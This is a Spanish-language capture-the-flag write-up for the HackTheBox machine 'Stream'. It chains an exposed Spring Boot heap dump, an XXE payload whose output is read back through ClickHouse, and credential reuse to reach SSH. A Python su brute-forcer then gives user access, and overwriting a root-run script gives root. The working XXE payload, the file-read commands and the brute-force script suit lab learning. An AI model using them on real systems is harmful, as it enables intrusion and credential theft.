@@ -1,0 +1,328 @@
+---
+title: "Stream"
+platform: "HackTheBox"
+os: "Linux"
+difficulty: "Medium"
+date: 2026-11-01
+ports: ["22/ssh", "80/http", "8081/http"]
+tags: ["xxe", "spring-boot-actuator", "heap-dump", "clickhouse", "kafka", "credential-reuse", "systemd-timer", "linux-privesc"]
+summary: "Pipeline de ingesta de datos aeroportuarios (AIDX → Kafka → ClickHouse). Un heap dump de Spring Boot filtra credenciales, un XXE ciego se exfiltra a través de una tabla de ClickHouse, reuso de credenciales SASL para SSH, y RCE como root abusando de un timer de systemd que ejecuta un script escribible desde la base de datos."
+draft: false
+---
+
+Máquina **Medium** de Linux ambientada en una plataforma de datos aeroportuarios. El camino encadena seis vulnerabilidades distintas sin un solo exploit público: todo es enumeración, lectura de código y conexión de piezas. Una de las máquinas más "realistas" que he tocado — parece una arquitectura de microservicios de verdad.
+
+<AttackChain
+  label="Cadena de ataque · del heap dump a root"
+  steps={[
+    { title: 'Heap dump (Spring Actuator)', desc: 'El endpoint /actuator/heapdump sin restringir filtra las credenciales de ClickHouse.', action: 'XXE ciego en el ingest AIDX' },
+    { title: 'XXE → lectura de ficheros', desc: 'lxml resuelve entidades externas; la exfiltración es in-band leyendo la tabla de ClickHouse donde aterriza el XML parseado.', action: 'server.properties de Kafka' },
+    { title: 'Credenciales SASL', desc: 'El código del worker (leído por XXE) apunta al server.properties de Kafka, con las credenciales SASL en claro.', action: 'reuso de credenciales' },
+    { title: 'SSH como svc-infra', desc: 'El principal SASL comparte contraseña con la cuenta de sistema svc-infra.', action: 'brute force local de su' },
+    { title: 'martin_cole · user', desc: 'Sin política de bloqueo → brute force de su con rockyou → user.txt.', action: 'backup Kopia con un log filtrado' },
+    { title: "Password del 'default' de ClickHouse", desc: 'Un ALTER USER mal escrito quedó registrado con la contraseña; el backup Kopia la conserva.', action: 'WRITE ON FILE + timer de root' },
+    { title: 'RCE como root', desc: 'El usuario default puede escribir el script que un timer de systemd ejecuta como root.', tone: 'win' },
+  ]}
+/>
+
+## Reconocimiento
+
+### Nmap
+
+```bash
+nmap -sC -sV -p- 10.129.247.123 -oN nmap.txt
+```
+
+```text
+22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.19
+80/tcp    open  http     nginx 1.24.0 (Ubuntu)
+8081/tcp  open  http     Uvicorn
+33811/tcp open  tcpwrapped
+```
+
+Tres superficies: SSH, un nginx que responde JSON, y un **Uvicorn** en 8081 (servidor ASGI de Python → casi siempre FastAPI detrás). El puerto 80 redirige a un vhost, así que lo primero es poblar el `/etc/hosts`.
+
+### Virtual hosts
+
+El redirect de nginx apunta a `api.htb-airport.htb`. Enumerando aparece también `db.htb-airport.htb`:
+
+```bash
+echo "10.129.247.123 htb-airport.htb api.htb-airport.htb db.htb-airport.htb" | sudo tee -a /etc/hosts
+```
+
+### Fingerprinting de servicios
+
+Mirar las cabeceras de cada superficie separa las tecnologías:
+
+```bash
+curl -sI http://api.htb-airport.htb/     # HTTP/1.1 200  (sin reason-phrase) -> Spring Boot/Java tras nginx
+curl -sI http://htb-airport.htb:8081/    # server: uvicorn               -> FastAPI/Python
+```
+
+<Callout type="tip">
+El `HTTP/1.1 200` pelado, sin texto tras el código, es una firma clásica de un backend Java (Tomcat/Spring) proxiado por nginx. El formato de error JSON `{"timestamp","status","error","path"}` lo confirma: es Spring Boot.
+</Callout>
+
+El `:8081` se describe a sí mismo:
+
+```json
+{
+  "service": "AIDX flight-leg ingest",
+  "note": "Ingest does not parse. Full validation happens downstream.",
+  "how": { "method": "POST", "path": "/feeds/aidx", "content_type": "application/xml" },
+  "required_elements": ["IATA_AIDX_FlightLegNotifRQ","Originator","FlightLeg","LegIdentifier"]
+}
+```
+
+Un ingest que **acepta XML que yo controlo** y lo pasa a un parser "downstream" que no veo. Eso es terreno de **XXE**. Pero, como se verá, no es el primer paso: sin saber dónde aterriza el XML parseado, el XXE no tiene canal de salida.
+
+## Foothold
+
+### 1. Spring Boot Actuator → heap dump
+
+La app Java en `api.htb-airport.htb` expone Actuator con el heap dump **sin restringir**:
+
+```bash
+curl -s http://api.htb-airport.htb/actuator          # lista _links, incluye heapdump
+curl -s http://api.htb-airport.htb/actuator/heapdump -o heapdump.hprof
+```
+
+Un `.hprof` es un volcado de la memoria de la JVM: los secretos viven ahí como strings en claro. En vez de `strings` a pelo, uso la herramienta especializada:
+
+```bash
+wget https://github.com/whwlsfb/JDumpSpider/releases/latest/download/JDumpSpider-1.1-SNAPSHOT-full.jar -O JDumpSpider.jar
+java -jar JDumpSpider.jar heapdump.hprof
+```
+
+```text
+com.zaxxer.hikari.util.Credentials:
+  [password = <REDACTED>, username = svc_events]
+
+management.endpoint.heapdump.access = unrestricted   <- el misconfig, confesado
+```
+
+Credenciales del pool Hikari para **`svc_events`**. Son las de ClickHouse, proxiada en `db.htb-airport.htb`.
+
+<Callout type="info">
+**Finding:** `/actuator/heapdump` expuesto es crítico por sí solo (CWE-200, exposición de memoria con secretos). En producción un heap dump puede contener PII de clientes.
+</Callout>
+
+### 2. Entender el pipeline
+
+ClickHouse es una base de datos columnar analítica, con interfaz HTTP:
+
+```bash
+curl -s "http://db.htb-airport.htb/?user=svc_events&password=<REDACTED>" --data-binary "SELECT currentUser()"
+# svc_events
+
+curl -s "http://db.htb-airport.htb/?user=svc_events&password=<REDACTED>" --data-binary "SHOW TABLES FROM partner_feed"
+# flightleg_json, flightleg_raw, flightleg_raw_kafka ...
+```
+
+La tabla `partner_feed.flightleg_json` almacena el XML **ya parseado** por el consumer downstream. Enviando un documento AIDX de prueba y leyéndolo de vuelta, se ve el mapeo campo→columna:
+
+```json
+"all_fields": { "LegIdentifier": { "Airline": "stream", "FlightNumber": "1337" } }
+```
+
+**Aquí está el canal de exfiltración del XXE.** El ingest (FastAPI) no parsea; el consumer parsea y escribe en ClickHouse; yo leo ClickHouse con las credenciales del heap dump. El XXE es **ciego por HTTP** (el parser, lxml, corre con `no_network=False` → no sale a la red, por eso un callback OOB nunca llega), pero **in-band a través de la base de datos**.
+
+### 3. XXE en el ingest AIDX
+
+El ingest solo valida que estén presentes los 4 nombres de elemento; el parser real es `lxml` con `resolve_entities=True`. La estructura AIDX importa: `Originator` lleva su dato en **atributos** (no mapea), pero elementos de texto como `<Airline>` **sí** se leen como contenido — y las entidades externas no se expanden en atributos, así que un elemento de texto es justo el sitio correcto.
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<IATA_AIDX_FlightLegNotifRQ Version="2" TransactionIdentifier="xxe-1">
+  <Originator CompanyShortName="T"/>
+  <FlightLeg><LegIdentifier><Airline>&xxe;</Airline></LegIdentifier></FlightLeg>
+</IATA_AIDX_FlightLegNotifRQ>
+```
+
+```bash
+curl -s -X POST http://htb-airport.htb:8081/feeds/aidx \
+  -H "Content-Type: application/xml" --data-binary @payload.xml
+
+curl -s "http://db.htb-airport.htb/?user=svc_events&password=<REDACTED>" \
+  --data-binary "SELECT airline, event FROM partner_feed.flightleg_json WHERE transaction_id='xxe-1' FORMAT Vertical"
+```
+
+El contenido del fichero aparece en la columna `airline`. Lectura arbitraria de ficheros confirmada.
+
+<Callout type="tip">
+Usar un `TransactionIdentifier` único por petición y filtrar por él en ClickHouse es clave: en un pipeline asíncrono no puedes fiarte de "la fila más reciente". Mismo patrón que rastrear una second-order injection. Sirve también para el cleanup: `ALTER TABLE ... DELETE WHERE transaction_id LIKE 'xxe-%'`.
+</Callout>
+
+`/etc/passwd` revela tres usuarios con shell: `svc-infra`, `martin_cole`, root.
+
+### 4. Leer el código → credenciales de Kafka
+
+`/proc/self/environ` y `/proc/self/cmdline` fallan (bytes NULL, ilegales en XML). Pero el código del worker sí se lee vía `/proc/self/cwd/`:
+
+```text
+file:///proc/self/cwd/parser_worker.py
+```
+
+El worker revela la arquitectura: topics de Kafka (`aidx.flightleg.raw.v1`, `.json.v1`, **`.dlq.v1`**), y que la config va por entorno. Las credenciales SASL están en el `server.properties` de Kafka — un directorio versionado que hay que encontrar (no se adivina):
+
+```text
+file:///opt/kafka_2.13-4.3.1/config/server.properties
+```
+
+```properties
+listener.name.sasl_plaintext.plain.sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required \
+   user_svc_infra="<REDACTED>";
+
+allow.everyone.if.no.acl.found=true     <- sin ACLs (importa para el root)
+```
+
+### 5. SSH como svc-infra
+
+El principal SASL `svc_infra` comparte contraseña con la cuenta de sistema `svc-infra` (guion bajo vs medio, mismo secreto):
+
+```bash
+sshpass -p '<REDACTED>' ssh -o StrictHostKeyChecking=no svc-infra@htb-airport.htb
+```
+
+<Callout type="warning">
+La password lleva un `$` → **comillas simples obligatorias** en bash, o esa parte se interpreta como variable y mandas una contraseña incompleta.
+</Callout>
+
+## Lateral: svc-infra → martin_cole
+
+`svc-infra` no tiene el flag (está en `/home/martin_cole/`, sin acceso). La cuenta de `martin_cole` tiene una contraseña en `rockyou.txt` y la máquina **no tiene bloqueo de intentos**, así que se puede hacer brute force local de `su`.
+
+`su` exige un TTY real, así que no acepta la password por stdin — hay que usar un pseudo-terminal con `pty.fork()`:
+
+```python
+import pty, os, time, select, sys
+WORDLIST, TARGET = "/tmp/rockyou.txt", "martin_cole"
+
+def try_pw(pw):
+    pid, fd = pty.fork()
+    if pid == 0:
+        os.execvp("su", ["su", "-", TARGET])
+    buf = b""; t = time.time() + 2
+    while time.time() < t:
+        r,_,_ = select.select([fd],[],[],0.1)
+        if r:
+            try: buf += os.read(fd, 4096)
+            except OSError: break
+            if b"assword" in buf: break
+    try: os.write(fd, pw.encode()+b"\n")
+    except OSError: pass
+    out=b""; t=time.time()+1.0
+    while time.time() < t:
+        r,_,_ = select.select([fd],[],[],0.1)
+        if not r: continue
+        try: chunk=os.read(fd,4096)
+        except OSError: break
+        if not chunk: break
+        out+=chunk
+        if b"Authentication failure" in out: break
+    try: os.write(fd, b"echo MARK_$((7*7))\n")
+    except OSError: pass
+    t=time.time()+1.0
+    while time.time() < t:
+        r,_,_ = select.select([fd],[],[],0.1)
+        if not r: continue
+        try: chunk=os.read(fd,4096)
+        except OSError: break
+        if not chunk: break
+        out+=chunk
+        if b"MARK_49" in out: break
+    os.close(fd); os.waitpid(pid,0)
+    return b"MARK_49" in out
+
+for raw in open(WORDLIST,'rb'):
+    pw = raw.rstrip(b"\r\n").decode('utf-8','replace')
+    if pw and try_pw(pw):
+        print(f"[+] FOUND: {pw}"); sys.exit(0)
+```
+
+<Callout type="tip">
+El truco del **oracle**: tras meter la password ejecuto `echo MARK_$((7*7))`. Solo si hay shell, bash evalúa `$((7*7))=49` y aparece `MARK_49`. Convierte "¿funcionó?" en un string buscable — no se puede "ver" el prompt desde el script.
+</Callout>
+
+```bash
+su - martin_cole    # con la password encontrada
+cat ~/user.txt
+```
+
+**User flag.**
+
+## Privilege Escalation: martin_cole → root
+
+### 6. Backup Kopia → password del 'default' de ClickHouse
+
+En `~/backups/` hay un repositorio **Kopia** ya conectado, con un snapshot de `ch-logs` (logs de ClickHouse):
+
+```bash
+kopia snapshot list --all
+# kc43a7ec76aeac204b305df2b777304d1 ... /home/martin_cole/ch-logs
+
+mkdir -p /tmp/restore
+kopia snapshot restore kc43a7ec76aeac204b305df2b777304d1 /tmp/restore
+grep -rn -i 'IDENTIFIED BY' /tmp/restore/
+```
+
+```text
+<Error> DynamicQueryHandler: Code: 62. DB::Exception: Double quoted string is not closed:
+  "ALTER USER default IDENTIFIED BY '<REDACTED> ;
+```
+
+Alguien ejecutó un `ALTER USER` con la comilla de cierre mal puesta → error de sintaxis → **ClickHouse logueó el comando entero con la password**. Así se obtiene la contraseña del usuario `default`.
+
+<Callout type="info">
+**Finding (CWE-532):** credenciales filtradas en logs. ClickHouse no debería registrar sentencias con secretos (`query_masking_rules`); y el backup perpetúa el secreto con permisos laxos.
+</Callout>
+
+### 7. WRITE ON FILE + timer de root → RCE
+
+Tres piezas, todas recolectadas en pasos anteriores, encajan:
+
+1. **Un timer de systemd corre como root cada 2 minutos:**
+
+```ini
+# /etc/systemd/system/aidx-dlq-drainer.service
+[Service]
+Type=oneshot
+User=root
+ExecStart=/usr/bin/python3 /opt/ops/dlq_drainer.py
+```
+
+El drainer consume la cola DLQ y, por cada mensaje, ejecuta un script formateador en `/var/lib/clickhouse/user_files/`.
+
+2. **El usuario `default` de ClickHouse tiene `WRITE ON FILE`** y puede escribir en ese directorio vía `INSERT INTO FUNCTION file(...)` → puedo sobrescribir el script que root ejecuta.
+
+3. **Kafka sin ACLs** (`allow.everyone.if.no.acl.found=true`) → puedo meter un mensaje en la DLQ para disparar el drainer (o esperar ≤2 min al timer).
+
+Con esas tres piezas: se sobrescribe el script formateador con un payload (una reverse shell) vía `INSERT INTO FUNCTION file(...)` sobre ClickHouse, se dispara el drainer metiendo un mensaje en la DLQ de Kafka (o se espera al timer), y el timer de root ejecuta el payload.
+
+```text
+connect to [10.10.14.81] from (UNKNOWN) [10.129.247.123] 41492
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+**Root flag.**
+
+<Callout type="warning">
+Patrón del privesc: un proceso privilegiado (root) ejecuta un recurso (el script) que un proceso no privilegiado y controlable (ClickHouse) puede modificar. Siempre que algo corra como root ejecutando un fichero, la pregunta es: **¿puedo escribir en ese fichero o en algo de lo que dependa?**
+</Callout>
+
+## Conclusión
+
+Stream no tiene un solo CVE: es una cadena de **misconfiguraciones** encadenadas, cada una realista por separado.
+
+| # | Vulnerabilidad | Impacto |
+|---|---|---|
+| 1 | Spring Boot Actuator heap dump sin restringir | Fuga de credenciales (CWE-200) |
+| 2 | XXE en parser lxml (`resolve_entities=True`) | Lectura arbitraria de ficheros |
+| 3 | Reuso de credenciales SASL ↔ sistema | Acceso SSH |
+| 4 | Sin política de bloqueo de intentos | Brute force local de `su` |
+| 5 | Credenciales en logs + backup accesible | Fuga de password admin (CWE-532) |
+| 6 | `WRITE ON FILE` + timer de root escribible + Kafka sin ACLs | RCE como root |
+
+**La lección que me llevo:** el privesc final no salió de la nada. La DLQ la vi en el código del worker, el `allow.everyone` en el `server.properties`, la versión de ClickHouse en un mensaje de error. Enumerar bien significa que, cuando llegas al último paso, ya tienes todas las piezas en la mano — solo hay que conectarlas.
